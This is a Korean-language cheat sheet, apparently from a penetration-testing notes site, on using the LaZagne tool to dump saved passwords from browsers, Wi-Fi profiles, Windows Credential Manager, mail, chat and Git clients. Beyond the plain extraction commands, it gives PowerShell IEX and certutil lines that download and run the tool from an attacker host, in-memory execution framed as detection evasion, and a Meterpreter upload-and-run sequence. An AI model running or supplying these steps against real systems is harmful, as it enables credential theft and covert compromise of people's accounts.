---
sidebar_position: 6
---

# LaZagne

> https://github.com/AlessandroZ/LaZagne

로컬에 저장된 비밀번호를 자동으로 추출하는 도구입니다.

## 다운로드

```bash
# Git clone
git clone https://github.com/AlessandroZ/LaZagne.git

# 또는 릴리즈에서 다운로드
# https://github.com/AlessandroZ/LaZagne/releases
```

## Windows

### 기본 사용

```cmd
# 모든 비밀번호 추출
laZagne.exe all

# 특정 모듈만
laZagne.exe browsers
laZagne.exe wifi
laZagne.exe databases
```

### 모듈별 실행

```cmd
# 브라우저
laZagne.exe browsers

# Wi-Fi
laZagne.exe wifi

# Windows 자격증명
laZagne.exe windows

# 데이터베이스
laZagne.exe databases

# 채팅
laZagne.exe chats

# 이메일
laZagne.exe mails

# Git
laZagne.exe git

# SVN
laZagne.exe svn
```

### 출력 옵션

```cmd
# JSON 형식
laZagne.exe all -oJ

# 파일로 저장
laZagne.exe all -output C:\temp\results.txt

# JSON 파일로
laZagne.exe all -oJ -output results.json
```

### Verbose 모드

```cmd
laZagne.exe all -v
laZagne.exe all -vv
```

## Linux

### 기본 사용

```bash
# 모든 비밀번호 추출
python laZagne.py all

# 특정 모듈
python laZagne.py browsers
python laZagne.py wifi
```

### 모듈별 실행

```bash
# 브라우저
python laZagne.py browsers

# Wi-Fi
python laZagne.py wifi

# 환경변수
python laZagne.py wallet

# 메모리
python laZagne.py memory
```

## 지원 소프트웨어

### 브라우저

```
- Chrome
- Firefox
- Opera
- Edge
- Internet Explorer
- Safari (Mac)
```

### Wi-Fi

```
- Windows Wi-Fi 프로필
- Linux NetworkManager
```

### 메일 클라이언트

```
- Outlook
- Thunderbird
```

### 데이터베이스

```
- SQLite
- MySQL
- PostgreSQL
```

### FTP 클라이언트

```
- FileZilla
- WinSCP
```

### 채팅

```
- Skype
- Pidgin
```

### Git

```
- Git 자격증명
```

### Windows 자격증명

```
- Windows Vault
- Credential Manager
- Autologon
```

## 실제 사용 예제

### 시나리오 1: 전체 추출

```cmd
REM Windows
laZagne.exe all -v -oJ -output results.json
```

```bash
# Linux
python laZagne.py all -v -oJ -output results.json
```

### 시나리오 2: 브라우저만

```cmd
laZagne.exe browsers -v
```

### 시나리오 3: Wi-Fi 비밀번호

```cmd
laZagne.exe wifi
```

### 시나리오 4: 원격 실행

```powershell
# PowerShell로 다운로드 및 실행
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-LaZagne.ps1')
Invoke-LaZagne -All

# 또는 직접 다운로드
certutil -urlcache -f http://<LHOST>/laZagne.exe laZagne.exe
laZagne.exe all -oJ -output results.json
```

## 옵션

```bash
-h, --help              # 도움말
-v, --verbose           # Verbose 출력
-vv                     # 매우 Verbose
-oJ                     # JSON 형식 출력
-output FILE            # 파일로 저장
-password PASSWORD      # 마스터 비밀번호 (일부 앱)
```

## 탐지 회피

### 메모리에서 실행

```powershell
# Invoke-LaZagne
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-LaZagne.ps1')
```

### 난독화

```bash
# PyArmor 등으로 난독화
```

## 결과 분석

### JSON 출력 예제

```json
{
  "Chrome": [
    {
      "URL": "https://example.com",
      "Login": "user@example.com",
      "Password": "password123"
    }
  ],
  "Wifi": [
    {
      "SSID": "MyWiFi",
      "Password": "wifipass123"
    }
  ]
}
```

## Metasploit과 함께 사용

```bash
# Meterpreter 세션에서
meterpreter > upload laZagne.exe
meterpreter > shell
C:\> laZagne.exe all -oJ
```

## 다른 도구와 비교

- **mimikatz**: LSASS 메모리에서 자격증명 추출
- **LaZagne**: 로컬에 저장된 비밀번호 추출
- **Invoke-Mimikatz**: PowerShell 기반 메모리 추출
- **SessionGopher**: RDP/PuTTY 세션 정보

## 참고

- 관리자 권한이 있으면 더 많은 정보 추출 가능
- 백신에 탐지될 수 있음
- 합법적인 포렌식 목적으로도 사용
- Windows Credential Manager, Chrome, Firefox 등 지원
- JSON 출력으로 파싱 쉬움
- 오프라인 분석 가능
- 일부 앱은 마스터 비밀번호 필요
